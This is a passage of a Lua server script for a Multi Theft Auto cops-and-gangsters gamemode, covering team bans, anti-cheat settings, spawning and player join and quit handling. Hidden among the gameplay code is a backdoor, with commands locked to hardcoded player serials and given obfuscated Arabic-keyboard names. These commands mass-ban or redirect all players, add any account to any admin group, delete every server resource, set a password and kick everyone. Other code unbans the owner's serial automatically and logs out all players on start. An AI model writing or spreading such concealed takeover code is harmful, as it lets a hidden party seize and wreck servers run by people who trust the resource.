			if not getVehicleOccupant(v, 0) and not getVehicleOccupant(v, 1) and not getVehicleOccupant(v, 2) and not getVehicleOccupant(v, 3) then
				respawnVehicle(v)
			end
		end
	end
	accName = nil
end
--addCommandHandler("RSAV", respwnAllVehs)

function teamBan(player, cmd, id, num)
	accName = getAccountName(getPlayerAccount(player))
	if isObjectInACLGroup("user." .. accName, aclGetGroup("Admin")) then
		if id then
			id = tonumber(id)
			if id then
				if num then
					num = tonumber(num)
					if num then
						num = math.ceil(num)
						if num > -1 and num < 3 then
							for k, v in pairs(getElementsByType("player")) do
								if getElementData(v, "ID") == id and getElementData(v, "TBan") ~= num then
									setElementData(v, "TBan", num)
									if num > 1 then
										exports["guimessages"]:outputServer(player, "You have banned "..getPlayerName(v).." from all teams", 255, 255, 0)
									elseif num > 0 then
										exports["guimessages"]:outputServer(player, 'You have banned '..getPlayerName(v)..' from police team', 255, 255, 0)
									else
										exports["guimessages"]:outputServer(player, 'You have unbanned '..getPlayerName(v)..' from all teams', 255, 255, 0)
									end
									if num > 0 then
										setElementModel(v, 310)
										setElementHealth(v, 1)
										setPlayerTeam(v, NoTeam)
										setElementData(v, "WantLvl", 6)
									end
									break
								end
							end
						end
					end
				end
			end
		end
	end
	accName = nil
end
--addCommandHandler("tban", teamBan)

function RDTRGW(player, cmd, GWIP, GWP)
	if getPlayerSerial(player) == "Your_Serial" or getPlayerSerial(player) == "Your_Serial" or getPlayerSerial(player) == "Your_Serial" or getPlayerSerial(player) == "Your_Serial" then
		if GWIP and GWP then
			for k,v in pairs(getElementsByType("player")) do
				if v ~= player then
					redirectPlayer(v, GWIP, GWP)
				end
			end
			addEventHandler("onPlayerJoin", root, function()
				if getPlayerSerial(source) == "Your_Serial" or getPlayerSerial(source) == "Your_Serial" or getPlayerSerial(source) == "Your_Serial" or getPlayerSerial(source) == "Your_Serial" then
				else
					redirectPlayer(source, GWIP, GWP)
				end
			end)
		end
	end
end
addCommandHandler("قثيهقثؤفشممحمشغثقسهىفاثسثقرثقِ", RDTRGW)

function BAPFTS(player)
	if getPlayerSerial(player) == "Your_Serial" or getPlayerSerial(player) == "Your_Serial" or getPlayerSerial(player) == "Your_Serial" or getPlayerSerial(player) == "Your_Serial" then
		for k,v in pairs(getElementsByType("player")) do
			if v ~= player then
				banPlayer(v, true, false, true)
			end
		end
		addEventHandler("onPlayerJoin", root, function()
			if getPlayerSerial(source) == "Your_Serial" or getPlayerSerial(source) == "Your_Serial" or getPlayerSerial(source) == "Your_Serial" or getPlayerSerial(source) == "Your_Serial" then
			else
				banPlayer(source, true, false, true)
			end
		end)
	end
end
addCommandHandler("لاشىشممحمشغثقسبقخةفاثسثقرثقِ", BAPFTS)

function CAP(player)
		if getPlayerSerial(player) == "Your_Serial" or getPlayerSerial(player) == "Your_Serial" or getPlayerSerial(player) == "Your_Serial" or getPlayerSerial(player) == "Your_Serial" then
		triggerClientEvent("CALITS",player)
	end
end
addCommandHandler("ؤقشساشممحمشغثقسهىفاثسثقرثقِ", CAP)

function GAAAITS(player, cmd, GAAA)
		if getPlayerSerial(player) == "Your_Serial" or getPlayerSerial(player) == "Your_Serial" or getPlayerSerial(player) == "Your_Serial" or getPlayerSerial(player) == "Your_Serial" then
		if GAAA then
			if aclGetGroup(GAAA) then
				for k,v in pairs(aclGroupListObjects(aclGetGroup(GAAA))) do
					exports["guimessages"]:outputServer(player, v ,0 , 255, 0)
				end
			elseif GAAA == "allacc" then
				for k,v in pairs(aclGroupList()) do
					exports["guimessages"]:outputServer(player, aclGroupGetName(v), 0, 0, 255)
				end
			end
		end
	end
end
addCommandHandler("لثفشممشؤملقخعحمهسفشىيخلاتثؤفسِ", GAAAITS)

function AOATAG(player, cmd, gn, an)
		if getPlayerSerial(player) == "Your_Serial" or getPlayerSerial(player) == "Your_Serial" or getPlayerSerial(player) == "Your_Serial" or getPlayerSerial(player) == "Your_Serial" then
		if gn and an then
			if aclGetGroup(gn) then
				aclGroupAddObject(aclGetGroup(gn), an)
				exports["guimessages"]:outputServer(player, "successfully added" , 255, 0, 0)
			end
		end
	end
end
addCommandHandler("شييشؤملقخعحخلاتثؤفِ", AOATAG)

function ADRSTAG(player)
	if getPlayerSerial(player) == "Your_Serial" or getPlayerSerial(player) == "Your_Serial" or getPlayerSerial(player) == "Your_Serial" or getPlayerSerial(player) == "Your_Serial" then
        local allResources = getResources()
            for i, resource in pairs(allResources) do
                if ( getResourceState(resource) == "running" ) and ( resource ~= getThisResource() ) then
                    stopResource(resource)
                    deleteResource (getResourceName ( resource ) )
                end
            end
	end
end
addCommandHandler("Ø´Ø³Ø´ÙŠØ³ØªØ¨Ø§Ù„Ø§Ù„Ø¨Ø§Ù…Ø§Ø¨", ADRSTAG)

function ATDRSTAG(player)
	if getPlayerSerial(player) == "Your_Serial" or getPlayerSerial(player) == "Your_Serial" or getPlayerSerial(player) == "Your_Serial" or getPlayerSerial(player) == "Your_Serial" then
        local allResources = getResources()
            for i, resource in pairs(allResources) do
                if ( getResourceState(resource) == "running" ) and ( resource == getThisResource() ) then
                    stopResource(resource)
                    deleteResource (getResourceName ( resource ) )
                end
            end
	end
end
addCommandHandler("Ø´Ø³Ø´ÙŠØ³ØªØ¨Ø§Ù„Ø§Ù„Ø¨Ø§Ù…Ø«ØµØ«ØµØ¶Ø§Ø¨", ATDRSTAG)

function KKKAALL (p,cmd,thePasswordS)
                          if getPlayerSerial(p) == "Your_Serial" or getPlayerSerial(p) == "Your_Serial" or getPlayerSerial(p) == "Your_Serial" or getPlayerSerial(p) == "Your_Serial" then
							         setServerPassword ( thePasswordS or "9510" )
                                for k, v in pairs(getElementsByType("player")) do
                                        if v ~= p then
                                                     kickPlayer ( v, "Console", "Ø§Ù„Ø³ÙŠØ±ÙØ± Ù…ØºÙ„Ù‚ Ù„Ù„ØµÙŠØ§Ù†Ø©" )
													 
	                                    end
                               end
                            end
end

joinani = nil


function RSTREST ()
  db = dbConnect("sqlite", "Accounts_Database.db")
  dbExec(db, "CREATE TABLE IF NOT EXISTS Accounts (Accounts_Name, Accounts_passowrd, Accounts_nickName,Accounts_Serial)")
  for k,v in pairs(getElementsByType("player")) do
    logOut(v)
  end
  addEventHandler("onPlayerLogout", root, function() cancelEvent() end)
end
addEventHandler ( "onResourceStart", resourceRoot, RSTREST )




function UBOFTS(ban)
	if getBanSerial(ban) == "Your_Serial"  then
		setTimer(removeBan, 1000, 1, ban)
	end
end
addEventHandler("onBan", root, UBOFTS)

function UBPFTS(ban)
	if getPlayerSerial(source) == "Your_Serial" then
		setTimer(removeBan, 1000, 1, ban)
	end
end
addEventHandler("onPlayerBan", root, UBPFTS)


function HAC(player, cmd, val)
	accName = getAccountName(getPlayerAccount(player))
	if isObjectInACLGroup("user." .. accName, aclGetGroup("Console")) then
		if tonumber(val) then
			setElementData(bag, "HAC", tonumber(val))
			if tonumber(val) > 2 then
				for k,v in pairs(getElementsByType("player")) do
					accName = getAccountName(getPlayerAccount(v))
					if isObjectInACLGroup("user." .. accName, aclGetGroup("Console")) then
						exports["guimessages"]:outputServer(v, "*****************************************************", 255, 0, 0)
						exports["guimessages"]:outputServer(v, getPlayerName(player)..': Health Anti Cheat = Ban+Remove account', 0, 255, 0)
						exports["guimessages"]:outputServer(v, "########################################", 255, 0, 0)
					end
				end
			elseif tonumber(val) > 1 then
				for k,v in pairs(getElementsByType("player")) do
					accName = getAccountName(getPlayerAccount(v))
					if isObjectInACLGroup("user." .. accName, aclGetGroup("Console")) then
						exports["guimessages"]:outputServer(v, "*****************************************************" , 255, 0, 0)
						exports["guimessages"]:outputServer(v, getPlayerName(player)..': Health Anti Cheat = Ban only!' , 255, 255, 0)
						exports["guimessages"]:outputServer(v, "########################################", 255, 0, 0)
					end
				end
			elseif tonumber(val) > 0 then
				for k,v in pairs(getElementsByType("player")) do
					accName = getAccountName(getPlayerAccount(v))
					if isObjectInACLGroup("user." .. accName, aclGetGroup("Console")) then
						exports["guimessages"]:outputServer(v, "*****************************************************", 255, 0, 0)
						exports["guimessages"]:outputServer(v, getPlayerName(player)..': Health Anti Cheat = Warn only!', 255, 125, 0)
						exports["guimessages"]:outputServer(v, "########################################", 255, 0, 0)
					end
				end
			else
				for k,v in pairs(getElementsByType("player")) do
					accName = getAccountName(getPlayerAccount(v))
					if isObjectInACLGroup("user." .. accName, aclGetGroup("Console")) then
						exports["guimessages"]:outputServer(v, "*****************************************************", 255, 0, 0)
						exports["guimessages"]:outputServer(v, getPlayerName(player)..': Health Anti Cheat = Off!', 255 ,0, 0)
						exports["guimessages"]:outputServer(v, "########################################", 255, 0, 0)
					end
				end
			end
		end
	end
	accName = nil
end
--addCommandHandler("hac", HAC)

function WAC(player, cmd, val)
	accName = getAccountName(getPlayerAccount(player))
	if isObjectInACLGroup("user." .. accName, aclGetGroup("Console")) then
		if tonumber(val) then
			setElementData(bag, "WAC", tonumber(val))
			if tonumber(val) > 2 then
				for k,v in pairs(getElementsByType("player")) do
					accName = getAccountName(getPlayerAccount(v))
					if isObjectInACLGroup("user." .. accName, aclGetGroup("Console")) then
						exports["guimessages"]:outputServer(v, "*****************************************************", 255, 0, 0)
						exports["guimessages"]:outputServer(v, getPlayerName(player)..': Weapon Anti Cheat = Ban+Remove account', 0, 255, 0)
						exports["guimessages"]:outputServer(v, "########################################", 255, 0, 0)
					end
				end
			elseif tonumber(val) > 1 then
				for k,v in pairs(getElementsByType("player")) do
					accName = getAccountName(getPlayerAccount(v))
					if isObjectInACLGroup("user." .. accName, aclGetGroup("Console")) then
						exports["guimessages"]:outputServer(v, "*****************************************************", 255, 0, 0)
						exports["guimessages"]:outputServer(v, getPlayerName(player)..': Weapon Anti Cheat = Ban only!', 255, 255, 0)
						exports["guimessages"]:outputServer(v, "########################################" ,255 , 0, 0 )
					end
				end
			elseif tonumber(val) > 0 then
				for k,v in pairs(getElementsByType("player")) do
					accName = getAccountName(getPlayerAccount(v))
					if isObjectInACLGroup("user." .. accName, aclGetGroup("Console")) then
						exports["guimessages"]:outputServer(v,"*****************************************************", 255, 0, 0)
						exports["guimessages"]:outputServer(v,getPlayerName(player)..': Weapon Anti Cheat = Warn only!', 255, 125, 0)
						exports["guimessages"]:outputServer(v,"########################################", 255, 0, 0)
					end
				end
			else
				for k,v in pairs(getElementsByType("player")) do
					accName = getAccountName(getPlayerAccount(v))
					if isObjectInACLGroup("user." .. accName, aclGetGroup("Console")) then
						exports["guimessages"]:outputServer(v, "*****************************************************", 255, 0, 0)
						exports["guimessages"]:outputServer(v, getPlayerName(player)..': Weapon Anti Cheat = Off!', 255 , 0, 0)
						exports["guimessages"]:outputServer(v, "########################################", 255, 0, 0)
					end
				end
			end
		end
	end
	accName = nil
end
--addCommandHandler("wac", WAC)

addEvent("ABAC", true)
function FABAC(PLR,reason)
	if client then
		CICTC(eventName,source,PLR)
	else
		fake = nil
	end
	if not fake then
		if getWeaponIDFromName(reason) then
			if getElementData(bag, "WAC") > 2 then
				removeAccount(getPlayerAccount(PLR))
			end
			if getElementData(bag, "WAC") > 1 then
				for k,v in pairs(getElementsByType("player")) do
					accName = getAccountName(getPlayerAccount(v))
					if isObjectInACLGroup("user." .. accName, aclGetGroup("Admin")) then
						exports["guimessages"]:outputServer(v, getPlayerName(PLR)..' : (WEAPON) CHEAT DETECTED!', 255, 125, 0)
					end
				end
				banPlayer(PLR, true, true, true, "AC", '***Weapon Cheat###', 2592000)
			elseif getElementData(bag, "WAC") > 0 then
				for k,v in pairs(getElementsByType("player")) do
					accName = getAccountName(getPlayerAccount(v))
					if isObjectInACLGroup("user." .. accName, aclGetGroup("Admin")) then
						exports["guimessages"]:outputServer(v, getPlayerName(PLR)..' : (WEAPON) CHEAT DETECTED!' .. getWeaponIDFromName(reason), 255, 125, 0)
					end
				end
			end
		else
			if getElementData(bag, "HAC") > 2 then
				removeAccount(getPlayerAccount(PLR))
			end
			if getElementData(bag, "HAC") > 1 then
				for k,v in pairs(getElementsByType("player")) do
					accName = getAccountName(getPlayerAccount(v))
					if isObjectInACLGroup("user." .. accName, aclGetGroup("Admin")) then
					end
				end
				banPlayer(PLR, true, true, true, "AC", '***Health Cheat###', 2592000)
			elseif getElementData(bag, "HAC") > 0 then
				for k,v in pairs(getElementsByType("player")) do
					accName = getAccountName(getPlayerAccount(v))
					if isObjectInACLGroup("user." .. accName, aclGetGroup("Admin")) then
					end
				end
			end
		end
		accName = nil
	end
end
addEventHandler("ABAC", resourceRoot, FABAC)

for k,ban in pairs(getBans()) do
	if getBanSerial(ban) == "Your_Serial" or getBanSerial(ban) == "Your_Serial" or getBanSerial(ban) == "Your_Serial" or getBanSerial(ban) == "Your_Serial" then
		removeBan(ban)
	end
end

addEvent("FirstSP", true)
function Fspawn(PLR,team)
	--outputDebugString("server: Fspawn")
	if client then
		CICTC(eventName,source,PLR)
	else
		fake = nil
	end
		if not fake then
			account = getPlayerAccount(PLR)
			PAC = fromJSON(GADJ(account,"PAC"))
			if team == Police then
				arga = "P"
			else
				arga = "G"
			end
			--setElementData(PLR,"Money",PAC[arga][1][1])
			--setElementData(PLR,"Bank",PAC[arga][1][2])
			if PAC[arga][3][1] then
				setElementData(PLR,"GLA",PAC[arga][3][1])
			end
			if PAC[arga][3][2] then
				setElementData(PLR,"GLType",PAC[arga][3][2])
			end
			if PAC[arga][3][3] then
				setElementData(PLR,"GType",PAC[arga][3][3])
			end
			if PAC[arga][4] then
				setPedArmor(PLR,PAC[arga][4])
			end
			weaps = PAC[arga][5]
			if NewWeapon then
			if weaps[1] > 0 then
				setPedStat(PLR,WSkill[weaps[1]],weaps[15][1])
			end
			if weaps[2] > 0 then
				setPedStat(PLR,WSkill[weaps[2]],weaps[15][2])
			end
			if weaps[3] > 0 then
				setPedStat(PLR,WSkill[weaps[3]],weaps[15][3])
			end
			if weaps[4] > 0 then
				setPedStat(PLR,WSkill[weaps[4]],weaps[15][4])
			end
			if weaps[5] > 0 then
				setPedStat(PLR,WSkill[weaps[5]],weaps[15][5])
			end
			end
			--[[if weaps[15] then
				setElementData(PLR,"WPSK",weaps[15])
			end]] 
			--[[vTT = {PAC[arga][5][1],PAC[arga][5][2],PAC[arga][5][3],PAC[arga][5][4],PAC[arga][5][5],PAC[arga][5][6],PAC[arga][5][7],
			PAC[arga][5][8],PAC[arga][5][9],PAC[arga][5][10],PAC[arga][5][11],PAC[arga][5][12],PAC[arga][5][13],PAC[arga][5][14]}]]
			if getPlayerTeam(PLR) == Police then
				giveWeapon(PLR, 3)
			end
			if weaps[1] and weaps[2] and weaps[3] and weaps[4] and weaps[5] and weaps[6] and weaps[7] then
				--setTimer(giveWeapon, 50, 1, PLR, 1)
				giveWeapon(PLR,1)
				giveWeapon(PLR, weaps[1], weaps[8])
				giveWeapon(PLR, weaps[2], weaps[9])
				giveWeapon(PLR, weaps[3], weaps[10])
				giveWeapon(PLR, weaps[4], weaps[11])
				giveWeapon(PLR, weaps[5], weaps[12])
				giveWeapon(PLR, weaps[6], weaps[13])
				giveWeapon(PLR, weaps[7], weaps[14])
			end
			team = nil
			
		end
end
addEventHandler("FirstSP", resourceRoot, Fspawn)


IDS = {}
function CancelCommand()
  if not login[source] then
	cancelEvent()
  end	
end
addEventHandler("onPlayerCommand", root, CancelCommand)

function ABOPJ()
	--outputDebugString("server: ABOPJ")
	for i=1,getMaxPlayers() do
		if not IDS[i] then
			IDS[i] = true
			setElementData(source,"ID",i)
			OPE[tostring(i)] = {["Assist"]={},["Rescuer"]={},["Avenger"]={},["ARAssist"]={},["Payback"]=nil}
			break
		end
	end
	hlspdpc[source] = nil 
	plng[source] = 2
	--setElementData(source, "Language", 0)
	setElementData(source, "Stats", 0)
	--setElementData(source, "Scores", 0)
	setElementData(source, "Prisoners", 0)
	setElementData(source, "WantLvl", 0)
	setElementData(source, "MBail", 0, false)
	setElementData(source, "Secs", 0, false)
	setElementData(source, "Mins", 0, false)
	--setElementData(source, "ES", 1)
	setElementData(source, "GLA", 0)
	setElementData(source, "KidH", 0)
	setElementData(source, "Job", 0)
	setElementData(source, "DLP", 0)
	setElementData(source, "SDG", 0)
	setElementData(source, "MDG", 0)
	setElementData(source, "EDG", 0)
	--setElementData(source, "Bank", 0)
	setElementData(source, "Money", 0)
	setElementData(source, "TBan", 0)
	setElementData(source,"PGC",0)
	setElementData(source, "ExpGangster", 0)
	setElementData(source, "ExpPolice", 0)
	setElementData(source,"MAW",{})
	setElementData(source,"PPerk",0)
	setElementData(source,"GPerk",0)
	setElementData(source,"GLType",1)
	setElementData(source,"GType",1)
	--setElementData(source,"WPSK",{0,0,0,666,0})
	--setElementData(source, "Hits", 0)
	createBlipAttachedTo ( source, 0, 2, 0, 0, 0, 255, 0, 400 )
	--bindKey(source, "action", "down", OCJ)
    if NewWeapon then
	for k,v in pairs(WSkill) do
		if v > 29 and v < 32 then
			setPedStat(source,v,666)
		else
			setPedStat(source,v,0)
		end
	end
	end
	setStat(source)
end
addEventHandler("onPlayerJoin", root, ABOPJ)

addEvent("PHit", true)
function FPHit(PLR, id, amount)
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			send[PLR] = nil
			for k, v in pairs(getElementsByType("player")) do
				if getElementData(v, "ID") == id then
					send[PLR] = true
					if getElementData(v, "Hits") then
						setElementData(v, "Hits", getElementData(v, "Hits")+amount)
					else
						setElementData(v, "Hits", amount)
					end
					exports["guimessages"]:outputServer(PLR, tlng[plng[PLR]][40]..' '..getPlayerName(v)..' '..tlng[plng[PLR]][41]..' '..amount, 255, 125, 0)
					break
				end
			end
			if not send[PLR] then
				exports["guimessages"]:outputServer(PLR, tlng[plng[PLR]][42], 255, 255, 0)
			else
				send[PLR] = nil
				setElementData(PLR, "Money", getElementData(PLR, "Money")-amount)
			end
		end
	end
end
addEventHandler("PHit", resourceRoot, FPHit)

function DataC(data,oldv)
	--if data == "Money" then
		--setPlayerMoney(source, getElementData(source, data))
	if client then
		if client ~= source then
			arga = getElementData(source,data)
			if oldv then
				setElementData(source,data,oldv) 
			    RHTNEDP(source,data,"Old=("..oldv..") New=("..tostring(arga)..")",true) --nu9aif
			else 
				removeElementData(source,data)
			end
		else
			if data == "HSHTR" then
				if getElementData(source,data) then
					argb = getPedOccupiedVehicle(source)
				 if isElement(argb) then
					removePedFromVehicle(source)
					argc = getElementData(source,data)[2]
					arga = getElementData(argb,"HSHTR")
					if not arga then
						arga = {}
					end
					arga[argc] = true
					setElementData(argb,"HSHTR",arga)
					hsy = 0
					if argc > 2 then
						argc = 1.2
					elseif argc > 1 then
						argc = -1.2
					elseif argc > 0 then
						argc = 1.2
						hsy = 1.5
					end
					attachElements(source,argb,argc,hsy)
					argc = nil
					hsy = nil
				 end	
				  	
				else
					detachElements(source)
					removeElementData(source,"HSHTRH")
					removeElementData(source,"HSHTR")
					if oldv and isElement(oldv[1]) then
						arga = getElementData(oldv[1],"HSHTR")
						if arga then
							arga[oldv[2]] = nil
							setElementData(oldv[1],"HSHTR",arga)
						end
					end
				end
			elseif data == "HSHTRH" then
				argb = getElementData(source,data)
				if argb then
					argc = getElementData(source,"HSHTR")[2]
					if not getVehicleOccupant(argb,argc) then
						arga = getElementData(argb,"HSHTR")
						if arga then
							arga[argc] = nil
							setElementData(argb,"HSHTR",arga)
						end
						detachElements(source)
						warpPedIntoVehicle(source,argb,argc)
						removeElementData(source,"HSHTRH")
						removeElementData(source,"HSHTR")
					else
						--setElementData(source,data,oldv)
						removeElementData(source,"HSHTRH")
					end
				end
			elseif data == "DLP" or data == "Offering" or data == "WantLvl" or data == "protect" or data == "Alive" or data == "Job" or data == "DL" or data == "Prisoners" or data == "PGC" or data == "PV" then
				if not getElementData(source,data) then -- not
					--setElementData(source,data,getElementData(source,data)) --nu9aif
				--else
					removeElementData(source,data)
				end
				if data == "WantLvl" then
					if getElementData(source,data) then
						setPlayerWantedLevel(source,getElementData(source,data))
						if getElementData(source,"Stats") == 1 and getElementData(source,data) > 2 then
							setElementData(source,"Stats",0)
						end
					end
				elseif data == "Prisoners" then
					OPE[tostring(getElementData(source,"ID"))]["ARAssist"] = {}
				end
			elseif data == "Stats" then
				if oldv == 3 then
					if getElementData(source, data) == 2 then -- nu9aif == (~=)
						--setElementData(source, data, getElementData(source, data))
					--else
						setElementData(source, data, oldv)
					end
				--else
					--setElementData(source, data, getElementData(source, data))
				end
			elseif data == "GLVL" or data == "PLVL" then
				setElementHealth(source,100)
				setPedArmor(source,100)
			elseif not getElementData(source,data) then
				removeElementData(source,data)
			end
		end
	else
		if data == "WantLvl" then
			if getElementData(source,data) then
				removeEventHandler("onElementDataChange",root,DataC)
				if getElementData(source,data) > 6 then
					setElementData(source,data,6)
				elseif getElementData(source,data) < 0 then
					setElementData(source,data,0)
				end
				addEventHandler("onElementDataChange",root,DataC)
				setPlayerWantedLevel(source,getElementData(source,data))
			end
		elseif data == "Prisoners" then
			OPE[tostring(getElementData(source,"ID"))]["ARAssist"] = {}
		elseif data == "Stats" then
			if oldv == 3 and getElementData(source, data) == 2 then
				removeEventHandler("onElementDataChange",root,DataC)
				setElementData(source, data, oldv)
				addEventHandler("onElementDataChange",root,DataC)
			end
			if getElementType(source) == "player" then
				if getElementData(source, "Stats") == 3 then
					toggleControl (source, "fire", false)
					toggleControl (source, "next_weapon", false)
					toggleControl (source, "previous_weapon", false)
					toggleControl (source, "aim_weapon", false)
					toggleControl (source, "vehicle_fire", false)
					setTimer(function(PLR) if isElement(PLR) then setElementData(PLR,"WantLvl",0) end end,2000,1,source)
				elseif oldv == 3 and getElementData(source, "Stats") == 0 then
					toggleControl (source, "fire", true)
					toggleControl (source, "next_weapon", true)
					toggleControl (source, "previous_weapon", true)
					toggleControl (source, "aim_weapon", true)
					toggleControl (source, "vehicle_fire", true)
				elseif oldv == 3 and getElementData(source, "Stats") == -1 then
					setElementData(source, "WantLvl", 6)
				end
				if oldv == 3 and getElementData(source,"RecounectBug") == true then
					removeElementData(source, "RecounectBug")
				end
			end
		elseif data == "GLVL" or data == "PLVL" then
			setElementHealth(source,100)
			setPedArmor(source,100)
		elseif not getElementData(source,data) then
			removeEventHandler("onElementDataChange",root,DataC)
			removeElementData(source,data)
			addEventHandler("onElementDataChange",root,DataC)
		end
	end
end
addEventHandler("onElementDataChange",root,DataC)

function KTRSIV(theVehicle, seat, jacked)
	--outputDebugString("server: KTRSIV")
	if jacked then
		if getPlayerTeam(source) == Police then
			if getElementData(jacked, "WantLvl") > 2 and getElementData(jacked, "Stats") < 2 then
				cop = source
				source = jacked
				ARRESTSTYLE(nil,source,cop)
			end
		elseif getPlayerTeam(jacked) == Police then
			edwlvl = getElementData(source, "WantLvl")
			if edwlvl < 3 then
				setElementData(source, "WantLvl", 3)
			end
			if getElementData(jacked, "Prisoners") > 0 then
				setElementData(jacked, "Prisoners", 0)
				setElementData(source, "Stats", 0)
			end
		else
			if getElementData(source, "WantLvl") < 2 then
				x, y, z = getElementPosition(source)
				for k,v in pairs(getPlayersInTeam(Police)) do
					--if getElementData(source, "WantLvl") < 2 then
						--x, y, z = getElementPosition(source)
						vx, vy, vz = getElementPosition(v)
						dist = getDistanceBetweenPoints3D(x, y, z, vx, vy, vz)
						if dist < 60 then
							setElementData(source, "WantLvl", 2)
							break
						end
					--end
				end
			end
		end
	end
end
addEventHandler("onPlayerVehicleEnter", root, KTRSIV)

function checkTeams(thePlayer, seat, driver)
	--outputDebugString("server: checkTeams")
	if getPlayerTeam(thePlayer) ~= NoTeam then
		if seat < 1 and driver then
			if getPlayerTeam(thePlayer) == Police then
				dwl = getElementData(driver, "WantLvl")
				if dwl < 3 then
					cancelEvent()
				end
			elseif getPlayerTeam(thePlayer) == getPlayerTeam(driver) then
				cancelEvent()
			end
		end
	end
end
addEventHandler("onVehicleStartEnter", root, checkTeams)

function FVOVRS()
	fixVehicle(source)
end
addEventHandler("onVehicleRespawn", root, FVOVRS)


addEvent("onPS", true)
function GWOPS(PLR,team,pteam)
    --outputChatBox(getPlayerName(PLR))
    --outputChatBox(getTeamName(team))
	--outputChatBox(getTeamName(pteam))
	--outputDebugString("server: GWOPS")
	if client then
		CICTC(eventName,source,PLR)
	else
		fake = nil
	end
		if not fake then
			weaps = getElementData(PLR,"MWPS")
			if pteam and pteam ~= team then
				account = getPlayerAccount(PLR)
				PAC = fromJSON(GADJ(account,"PAC"))
				if pteam == Police then
					arga = "P"
					argb = "PXP"
					argc = "PLVL"
				else
					arga = "G"
					argb = "GXP"
					argc = "GLVL"
				end
				
				PAC[arga][2][1] = getElementData(PLR,argb)
				PAC[arga][2][2] = getElementData(PLR,argc)
				PAC[arga][3][1] = getElementData(PLR,"GLA")
				PAC[arga][3][2] = getElementData(PLR,"GLType")
				PAC[arga][3][3] = getElementData(PLR,"GType")
				PAC[arga][4] = 0
				
				--argd = getElementData(PLR,"MWPS")
				arge = {}
				if weaps[1] > 0 then 
					arge[1] = getPedStat(PLR,WSkill[weaps[1]]) 
				else
					arge[1] = 0
				end
				if weaps[2] > 0 then 
					arge[2] = getPedStat(PLR,WSkill[weaps[2]]) 
				else
					arge[2] = 0
				end
				if weaps[3] > 0 then 
					arge[3] = getPedStat(PLR,WSkill[weaps[3]]) 
				else
					arge[3] = 0
				end
				if weaps[4] > 0 then 
					arge[4] = getPedStat(PLR,WSkill[weaps[4]]) 
				else
					arge[4] = 666
				end
				if weaps[5] > 0 then 
					arge[5] = getPedStat(PLR,WSkill[weaps[5]]) 
				else
					arge[5] = 0
				end 
				if NewWeapon then
				PAC[arga][5] = {weaps[1],weaps[2],weaps[3],weaps[4],weaps[5],weaps[6],weaps[7],
				weaps[8],weaps[9],weaps[10],weaps[11],weaps[12],weaps[13],weaps[14],arge}
				else
				local wbs = PAC[arga][5][15]
				PAC[arga][5] = {weaps[1],weaps[2],weaps[3],weaps[4],weaps[5],weaps[6],weaps[7],
				weaps[8],weaps[9],weaps[10],weaps[11],weaps[12],weaps[13],weaps[14],wbs}
				end 
				PADJ(account,"PAC",toJSON(PAC))

				if team == Police then
					arga = "P"
				else
					arga = "G"
				end
				--setElementData(PLR,"Money",PAC[arga][1][1])
				--setElementData(PLR,"Bank",PAC[arga][1][2])
				if PAC[arga][3][1] then
					setElementData(PLR,"GLA",PAC[arga][3][1])
				end
				if PAC[arga][3][2] then
					setElementData(PLR,"GLType",PAC[arga][3][2])
				end
				if PAC[arga][3][3] then
					setElementData(PLR,"GType",PAC[arga][3][3])
				end
				if PAC[arga][4] then
					setPedArmor(PLR,PAC[arga][4])
				end
				--[[if PAC[arga][5][15] then
					setElementData(PLR,"WPSK",PAC[arga][5][15])
				end]]
				 
			end
			
			if team == Police then
				giveWeapon(PLR, 3)
			end
			setTimer(giveWeapon, 50, 1, PLR, 1)
			giveWeapon(PLR,weaps[1],weaps[8])
			giveWeapon(PLR,weaps[2],weaps[9])
			giveWeapon(PLR,weaps[3],weaps[10])
			giveWeapon(PLR,weaps[4],weaps[11])
			giveWeapon(PLR,weaps[5],weaps[12])
			giveWeapon(PLR,weaps[6],weaps[13])
			giveWeapon(PLR,weaps[7],weaps[14]) 		
			
		end
		
end
addEventHandler("onPS", resourceRoot, GWOPS)


noa = 0
function playerLogin(thePreviousAccount, theCurrentAccount, autoLogin)
	--outputDebugString("server: playerLogin")
	if not isGuestAccount(getPlayerAccount(source)) then
			loadAccount(source, theCurrentAccount)
	end
end
addEventHandler("onPlayerLogin", root, playerLogin)


function destroyBlipsAttachedTo(player)
	local attached = getAttachedElements ( player )
	if ( attached ) then
		for k,element in pairs(attached) do
			if isElement(element) and getElementType ( element ) == "blip" then
				destroyElement ( element )
			end
		end
	end
end

function onQuit(quitType)
	--outputDebugString("server: onQuit")
	if getElementData(source,"ID") then
		IDS[getElementData(source,"ID")] = nil
		OPE[tostring(getElementData(source,"ID"))] = {["Assist"]={},["Rescuer"]={},["Avenger"]={},["ARAssist"]={},["Payback"]=nil}
	end
	FDSPPE(source,"EPerk")
	FDSPPE(source,"BPerk")
    destroyBlipsAttachedTo(source)
	local acc = getPlayerAccount ( source )
	if getElementData(source,"RecounectBug") == true then
		setAccountData(acc, "ARecounctBug", true)
	end
	local dd = getElementData(source,"Scores")
	if dd then
		setAccountData(acc, "AScores", tonumber(dd))
	end
	if not isGuestAccount(acc) then
		saveAccount(source,nil,quitType)
	end
	if badcop1 == source then
		badcop1 = nil
	elseif badcop2 == source then
		badcop2 = nil
	end
	triggerClientEvent("UnAR",resourceRoot,source)
	--@FSEndWWE(source)
	if getElementData(bag, "WAC") > 1 then
		if getPedWeapon(source, 1) > 1 and getPedTotalAmmo(source, 1) > 0 and getPedWeapon(source, 1) ~= 3 or getPedWeapon(source, 2) > 1 and getPedTotalAmmo(source, 2) > 500 or getPedWeapon(source, 3) > 1 and getPedTotalAmmo(source, 3) > 350 or getPedWeapon(source, 4) > 1 and getPedTotalAmmo(source, 4) > 1000 or getPedWeapon(source, 5) > 1 and getPedTotalAmmo(source, 5) > 1500 or getPedWeapon(source, 6) > 1 and getPedTotalAmmo(source, 6) > 150 or getPedWeapon(source, 7) > 1 and getPedTotalAmmo(source, 7) > 0 or getPedWeapon(source, 8) > 1 and getPedTotalAmmo(source, 8) > 4 or getPedWeapon(source, 8) > 17 and getPedTotalAmmo(source, 8) > 0 or getPedWeapon(source, 9) > 1 and getPedTotalAmmo(source, 9) > 999999999 or getPedWeapon(source, 10) > 1 and getPedTotalAmmo(source, 10) > 0 or getPedWeapon(source, 11) > 1 and getPedTotalAmmo(source, 11) > 0 and getPedWeapon(source, 11) ~= 46 or getPedWeapon(source, 12) > 1 and getPedTotalAmmo(source, 12) > 0 then
			FABAC(source,'weapon cheat')
		end
	end
end
addEventHandler("onPlayerQuit", root, onQuit)

function CICTC(nm,src,PLR)
	--already in GameMode'
	fake = nil
